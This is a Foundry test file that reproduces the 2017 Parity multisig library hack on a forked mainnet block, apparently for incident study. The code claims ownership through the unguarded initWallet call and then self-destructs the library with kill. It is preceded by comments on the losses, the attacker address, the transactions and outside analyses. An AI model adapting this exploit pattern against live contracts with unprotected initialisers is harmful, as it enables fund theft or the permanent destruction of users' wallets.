// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~150m USD
//   - 514k ETH
// Vulnerability Type : Incorrect Access Control
// Attacker : 0xae7168Deb525862f4FEe37d987A971b385b96952
// Exploit Contract : N/A
// Revenue Address : N/A
// Victim Contract : https://etherscan.io/accounts/label/parity-bug
// Vulnerable Snippet : https://etherscan.io/address/0xae7168Deb525862f4FEe37d987A971b385b96952#code#L223
// Attack Txs : 
//   - 0x05f71e1b2cb4f03e547739db15d080fd30c989eda04d37ce6264c5686e0722c9 (initWallet, height 4501990, T-56m14s)
//   - 0x47f7cff7a5e671884629c93b368cb18f58a993f4b19c2a53a8662e3f1482f690 (kill, height 4501736, T)
// 
// @Ref
// Openzeppelin's Technical Analysis (Jul.) : https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7
// Openzeppelin's Technical Analysis (Nov.) : https://blog.openzeppelin.com/parity-wallet-hack-reloaded
// Attacker's Conviction : https://github.com/openethereum/parity-ethereum/issues/6995
// Elementus.io : https://elementus.io/blog/which-icos-are-affected-by-the-parity-wallet-bug/

contract Attacker is Test {
    IWalletLibrary private constant walletLibrary = IWalletLibrary(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4);

    function setUp() public {
        vm.createSelectFork("mainnet", 4_501_735);
    }

    function testExploit() public {
        console.log("[Before Tx1] parity.isOwner(address(this)) = %s", walletLibrary.isOwner(address(this)));
        tx1();
        console.log("[After Tx1] parity.isOwner(address(this)) = %s", walletLibrary.isOwner(address(this)));

        console.log("[Before Tx2] destroying the WalletLibrary contract.");
        tx2();
        console.log("[After Tx2] WalletLibrary contract has been destroyed.");
        
        // Destroy validation:
        // cast call 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4 "isOwner(address)(bool)" 0xae7168Deb525862f4FEe37d987A971b385b96952 -r "https://rpc.ankr.com/eth"
        // >> Error: contract 0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4 does not have any code
    }

    function tx1() public {
        address[] memory owner = new address[](1);
        owner[0] = address(this);
        walletLibrary.initWallet(owner, 0, 0);
    }

    function tx2() public {
        walletLibrary.kill(address(this));
    }
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------

// Shortened interface, removed unused methods.
interface IWalletLibrary {
    function initWallet(address[] memory _owners, uint256 _required, uint256 _daylimit) external;
    function isOwner(address _addr) external view returns (bool);
    function kill(address _to) external;
}
